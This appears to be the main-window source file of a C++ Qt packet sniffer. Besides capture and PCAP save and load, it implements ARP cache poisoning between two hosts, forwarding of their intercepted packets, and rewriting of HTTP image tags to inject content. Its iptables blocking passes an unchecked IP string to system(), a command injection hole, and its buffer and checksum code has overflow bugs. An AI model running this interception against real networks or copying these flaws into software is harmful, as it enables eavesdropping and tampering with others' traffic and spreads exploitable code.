#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "Sniffer.h"
#include "dialoginterface.h"
#include "dialogblock.h"
#include "dialogarp.h"
#include <QFileDialog>
#include <cstdlib>

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    ui->pb_scroll->setCheckable(true);
    ui->pb_arp->setCheckable(true);
    ui->pb_arp->setEnabled(false);
    ui->pb_redirect->setCheckable(true);
    ui->pb_redirect->setDown(true);
    ui->tableWidget->setSelectionBehavior(QAbstractItemView::SelectRows);
    client1 = NULL;
    client2 = NULL;
    counter = 0;

    thread = new QThread();
    sniffer = new Sniffer();
    sniffer->moveToThread(thread);

    QTimer *timer = new QTimer(this);
    timer->setInterval(1);
    timer->start(100);
    connect(thread, SIGNAL(started()), sniffer, SLOT(Start()));
    connect(timer, SIGNAL(timeout()), this, SLOT(getNewPackets()));

    connect(ui->pb_sniff, SIGNAL(clicked()), this, SLOT(ToggleSniffer()));
    connect(ui->pb_clear, SIGNAL(clicked()), this, SLOT(Clear()));
    connect(ui->pb_load, SIGNAL(clicked()), this, SLOT(Load()));
    connect(ui->pb_save, SIGNAL(clicked()), this, SLOT(Save()));

    int                  one = 1;
    const int            *val = &one;

    _socket_arp = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);
    setsockopt(_socket_arp, IPPROTO_IP, IP_HDRINCL, (char *) val, sizeof(one));

    ui->pb_arp->setCheckable(true);
    connect(ui->pb_arp, SIGNAL(clicked()), this, SLOT(ArpPoisoning()));
#ifdef __linux__
    connect(ui->pb_block, SIGNAL(clicked()), this, SLOT(BlockIp()));
#endif

}

MainWindow::~MainWindow()
{
    delete ui;
#ifdef __linux__
    ::close(_socket_arp);


    for (std::list<std::string>::iterator it = this->_blocked_ip.begin(); it != this->_blocked_ip.end(); it++)
    {
        char    str_cmd[100];
        str_cmd[0] = 0;
        strcat(str_cmd, "iptables -D INPUT -s ");
        strcat(str_cmd, (*it).c_str());
        strcat(str_cmd, " -j DROP");
        system(str_cmd);
    }
#endif
}

void    MainWindow::Clear()
{
    sniffer->mutex.lock();
    ui->tableWidget->clearContents();
    ui->tableWidget->setRowCount(0);
    for (std::list<SniffedPacket *>::iterator it = sniffer->Packets.begin(); it != sniffer->Packets.end(); it++)
        delete *it;
    sniffer->Packets.clear();
    for (std::list<SniffedPacket *>::iterator it = this->Packets.begin(); it != this->Packets.end(); it++)
        delete *it;
    this->Packets.clear();
    sniffer->mutex.unlock();
}

void    MainWindow::getNewPackets()
{
    if (counter++ == 20)
    {
        counter = 0;
        this->refreshArp();
    }

    sniffer->mutex.lock();

    for (std::list<SniffedPacket *>::iterator it = sniffer->Packets.begin(); it != sniffer->Packets.end(); it++)
    {
        checkArp(*(*it));
        insertPacket(*(*it));
    }

    sniffer->Packets.clear();
    if (ui->pb_scroll->isChecked())
        ui->tableWidget->scrollToBottom();

    sniffer->mutex.unlock();
}

void    MainWindow::insertPacket(SniffedPacket &packet)
{
    int i = ui->tableWidget->rowCount();
    ui->tableWidget->insertRow(i);

    insertToIndex(packet.protocol, packet.ip_source.c_str(), i, 0);
    insertToIndex(packet.protocol, packet.ip_dest.c_str(), i, 1);
    insertToIndex(packet.protocol, QString::number(packet.size), i, 2);
    insertToIndex(packet.protocol, packet.protocol, i, 3);
    insertToIndex(packet.protocol, packet.info, i, 4);

    this->Packets.push_back(&packet);
}

void    MainWindow::insertToIndex(const QString &protocol, const QString &str, int row, int col)
{
    QTableWidgetItem *item = new QTableWidgetItem(str);
    
        if (protocol == "TCP")
        item->setBackgroundColor(QColor(0, 0, 255, 100));
    if (protocol == "UDP")
    item->setBackgroundColor(QColor(255, 0, 0, 100));
    if (protocol == "ICMP")
        item->setBackgroundColor(QColor(255, 255, 0, 100));
        
    item->setFlags(Qt::ItemIsSelectable | Qt::ItemIsEnabled);
    if (col != 4)
        item->setTextAlignment(Qt::AlignCenter);
    ui->tableWidget->setItem(row, col, item);
}

void                MainWindow::StartSniffing(const std::string &interface)
{
    this->interface = interface;
    sniffer->Initialize(interface);
    thread->start();
    ui->pb_sniff->setText("STOP");
    ui->pb_arp->setEnabled(true);
}

void                MainWindow::ToggleSniffer()
{
    if (this->sniffer->IsSniffing())
    {
        this->sniffer->Stop();
        if (!thread->wait(500))
        {
            thread->terminate();
            thread->wait();
        }
        this->sniffer->DeInitialize();
        ui->pb_sniff->setText("START");
        if (client1 != NULL)
        {
            delete client1;
            delete client2;
            client1 = NULL;

            ui->pb_arp->setDown(true);
        }
        ui->pb_arp->setEnabled(false);

        return ;
    }

    DialogInterface win(this, _ip, _mac);
    win.exec();
}

void                  MainWindow::Save()
{
    if (this->sniffer->IsSniffing())
        ToggleSniffer();

    QString           fileName = QFileDialog::getSaveFileName(this, tr("Save File"), "", tr("PCAP (*.pcap)"));

    std::ofstream file(fileName.toStdString(), std::ios::binary | std::ios::trunc | std::ios::out);
    if (file.is_open())
    {
        pcap_hdr_t	hdr;
        std::memset((char *) &hdr, 0, sizeof(hdr));
        hdr.magic_number = 0xA1B2C3D4;
        hdr.version_major = 2;
        hdr.version_minor = 4;
        hdr.snaplen = 65535;
        hdr.network = 1;
        file.write((char *) &hdr, sizeof(hdr));

        pcaprec_hdr_t hdrp;
        std::memset(&hdrp, 0, sizeof(hdrp));
        eth_hdr_t eth_hdr;
        eth_hdr.ether_type = 8;
        for (std::list<SniffedPacket *>::iterator it = this->Packets.begin(); it != this->Packets.end(); it++)
        {
            hdrp.incl_len = (*it)->size;
            if (!(*it)->has_ether_hdr)
                hdrp.incl_len += ETHER_HDR_SIZE;
            hdrp.orig_len = hdrp.incl_len;

            file.write((char *) &hdrp, sizeof(hdrp));
            if (!(*it)->has_ether_hdr)
                file.write((char *) &eth_hdr, ETHER_HDR_SIZE);
            file.write((*it)->data, (*it)->size);
        }

        file.close();
    }
    else
        qDebug() << "Unable to open file";
}

void                MainWindow::BlockIp()
{
    DialogBlock win(this);
    win.exec();
}

void    MainWindow::Block(const std::string &ip)
{
#ifdef __linux__
    if (ip.length() > 20)
        return;

    _blocked_ip.push_back(ip);

    char    str_cmd[100];
        str_cmd[0] = 0;
    strcat(str_cmd, "iptables -A INPUT -s ");
    strcat(str_cmd, ip.c_str());
    strcat(str_cmd, " -j DROP");
    system(str_cmd);
#endif
}

void    MainWindow::Unblock(const std::string &ip)
{
#ifdef __linux__
    if (ip.length() > 20)
        return;

    _blocked_ip.remove(ip);

    char    str_cmd[100];
    str_cmd[0] = 0;
    strcat(str_cmd, "iptables -D INPUT -s ");
    strcat(str_cmd, ip.c_str());
    strcat(str_cmd, " -j DROP");
    system(str_cmd);
#endif
}

void                  MainWindow::Load()
{
  if (this->sniffer->IsSniffing())
      ToggleSniffer();

  Clear();

  QString           fileName = QFileDialog::getOpenFileName(this, tr("Load File"), "", tr("PCAP (*.pcap)"));
  std::streampos    size;
  char              *memblock;

  std::ifstream file(fileName.toStdString(), std::ios::in | std::ios::binary | std::ios::ate);
  if (file.is_open())
  {
      size = file.tellg();
      memblock = new char [size];
      file.seekg (0, std::ios::beg);
      file.read (memblock, size);
      file.close();

    if (size < (int) sizeof(pcap_hdr_t))
        return ;

    pcap_hdr_t	&hdr = *(pcap_hdr_t *) memblock;
    if (hdr.magic_number != 0xa1b2c3d4)
    {
        qDebug() << "Wrong format";
        return ;
    }

    char *cursor = memblock + sizeof(hdr);
    pcaprec_hdr_t *hdrp;

    if (size < (int) sizeof(hdr) + (int) sizeof(hdrp))
        return;

    while ((int) (cursor - memblock) < size)
    {
      hdrp = (pcaprec_hdr_t *) cursor;

      cursor += sizeof(*hdrp);
      char  *data = cursor;

      if (size < cursor - memblock + hdrp->incl_len)
          return;

      Sniffer::ManagePacket(data, hdrp->incl_len, true);
      cursor += hdrp->incl_len;
    }

    delete[] memblock;
  }
  else
      qDebug() << "Unable to open file";
}

void                MainWindow::StartArp(const std::string &ip1, char *mac1, const std::string &ip2, char *mac2)
{
    client_t    *client = new client_t;
    client->ip = ip1;
    memcpy(client->mac, mac1, 6);
    client1 = client;

    client = new client_t;
    client->ip = ip2;
    memcpy(client->mac, mac2, 6);
    client2 = client;

    ui->pb_arp->setDown(true);
}

void                MainWindow::ArpPoisoning()
{
    if (client1 != NULL)
    {
        delete client1;
        delete client2;
        client1 = NULL;

        ui->pb_arp->setDown(false);

        return;
    }

    if (!this->sniffer->IsSniffing())
        return;

    Dialogarp win(this);
    win.exec();
}

void            MainWindow::refreshArp()
{
#ifdef __linux__
    if (client1 == NULL || client2 == NULL || !this->sniffer->IsSniffing())
        return;

    int                 sock;
    char                packet[PKTLEN];
    struct ether_header *eth = (struct ether_header *) packet;
    struct ether_arp    *arp = (struct ether_arp *) (packet + sizeof(struct ether_header));
    struct sockaddr_ll  device;

    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0)
        qDebug() << "fail socket";

    client_t    *client = client1;
    for (int i = 0; i < 2; ++i)
    {
        // To
        sscanf((client == client1 ? client2->ip : client1->ip).c_str(), "%d.%d.%d.%d", (int *) &arp->arp_spa[0],
                                       (int *) &arp->arp_spa[1],
                                       (int *) &arp->arp_spa[2],
                                       (int *) &arp->arp_spa[3]);
        // From
        std::memcpy(arp->arp_tha, client->mac, 6);
        // By
        std::memcpy(arp->arp_sha, _mac, 6);

        memcpy(eth->ether_dhost, arp->arp_tha, ETH_ALEN);
        memcpy(eth->ether_shost, arp->arp_sha, ETH_ALEN);
        eth->ether_type = htons(ETH_P_ARP);

        arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
        arp->ea_hdr.ar_pro = htons(ETH_P_IP);
        arp->ea_hdr.ar_hln = ETH_ALEN;
        arp->ea_hdr.ar_pln = IP4LEN;
        arp->ea_hdr.ar_op = htons(ARPOP_REPLY);

        memset(&device, 0, sizeof(device));
        device.sll_ifindex = if_nametoindex(this->interface.c_str());
        device.sll_family = AF_PACKET;
        memcpy(device.sll_addr, arp->arp_sha, ETH_ALEN);
        device.sll_halen = htons(ETH_ALEN);

        sendto(sock, packet, PKTLEN, 0, (struct sockaddr *) &device, sizeof(device));
        client = client2;
    }

    ::close(sock);
#endif
}

void    MainWindow::checkArp(SniffedPacket &packet)
{
    if (!ui->pb_redirect->isChecked() || client1 == NULL || client2 == NULL || !packet.has_ether_hdr)
        return;

    eth_hdr_t *eth = (eth_hdr_t *) packet.data;
    if (strncmp(eth->ether_dhost, _mac, 6))
        return;

    if (packet.ip_dest == _ip || packet.ip_source == _ip || !(strncmp(eth->ether_shost, client1->mac, 6) || strncmp(eth->ether_shost, client2->mac, 6)))
        return ;

    struct sockaddr_in   sin;

    IP_HDR  *ip = (IP_HDR *) (packet.data + ETHER_HDR_SIZE);

    sin.sin_family = AF_INET;
    sin.sin_port = 0;
    sin.sin_addr.s_addr = ip->ip_destaddr;

    replaceTCPText(packet, "img src=", "img src=\"http://upload.wikimedia.org/wikipedia/fr/f/fb/C-dans-l'air.png\"");

    sendto(_socket_arp, packet.data + ETHER_HDR_SIZE, packet.size - ETHER_HDR_SIZE, 0, (struct sockaddr *)&sin, sizeof(sin));
}

void    *memmem(const void *haystack, size_t hlen, const void *needle, size_t nlen)
{
    int needle_first;
    const void *p = haystack;
    size_t plen = hlen;

    if (!nlen)
        return NULL;

    needle_first = *(unsigned char *)needle;

    while (plen >= nlen && (p = memchr(p, needle_first, plen - nlen + 1)))
    {
        if (!memcmp(p, needle, nlen))
            return (void *)p;

        p = ((char *) p) + 1;
        plen = hlen - (((char *) p) - (char *) haystack);
    }

    return NULL;
}

void    MainWindow::replaceTCPText(SniffedPacket &packet, const std::string &find, const std::string &replace)
{
    if (packet.protocol != "TCP" || packet.sport != 80)
        return ;

    std::vector<std::size_t>    indexes;
    char                        *found;
    char                        *buffer = packet.data;
    while ((found = (char *) memmem(buffer, packet.size - (buffer - packet.data), find.c_str(), find.length()))!= NULL)
    {
        indexes.push_back(found - packet.data);
        buffer = found + find.length();
    }

    if (!indexes.size())
        return;

    int     new_size = packet.size + replace.length() * indexes.size() - find.length() * indexes.size();
    char    *data = new char[new_size];
    std::memmove(data, packet.data, packet.size);
    delete packet.data;
    packet.size = new_size;
    packet.data = data;

    for (std::size_t i = 0; i < indexes.size(); ++i)
    {
        qDebug() << "FOUND Replace";
        std::memmove(&data[indexes[i] + replace.length()], &data[indexes[i]], packet.size - indexes[i]);
        std::memcpy(&data[indexes[i]], replace.c_str(), replace.length());
    }

    // Modify TCP Checksum
    IP_HDR      *iphdr = (IP_HDR *) packet.data + ETHER_HDR_SIZE;
    TCP_HDR     *tcphdr = (TCP_HDR *) (char *) iphdr + packet.iphdr_size;
    uint32_t    sum = 0;
    uint16_t    padding = 0;
    uint16_t    proto_tcp = 6;
    uint16_t    w16;
    char        *datasum = (char *) tcphdr;
    int         size = packet.size - packet.iphdr_size;
    uint16_t    old_checksum = tcphdr->checksum;
    tcphdr->checksum = 0;

    if (size & 1)
    {
        padding = 1;
        datasum[size] = 0;
    }
    for (int i = 0; i < size + padding; i = i + 2)
    {
        w16 = ((datasum[i] << 8) & 0xFF00) + (datasum[i + 1] & 0xFF);
        sum += (unsigned long) (w16);
    }
    for (int i = 0; i < 4; i = i + 2)
    {
        w16 = ((((char *) &iphdr->ip_srcaddr)[i] << 8) & 0xFF00) + (((char *) &iphdr->ip_srcaddr)[i + 1] & 0xFF);
        sum += (w16);
        w16 = ((((char *) &iphdr->ip_destaddr)[i] << 8) & 0xFF00) + (((char *) &iphdr->ip_destaddr)[i + 1] & 0xFF);
        sum += (w16);
    }

    sum += (proto_tcp) + (size);
    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);
    sum = ~sum;

    tcphdr->checksum = (unsigned short) htons(sum);
    qDebug() << old_checksum << " = " << (unsigned short) htons(sum);
}
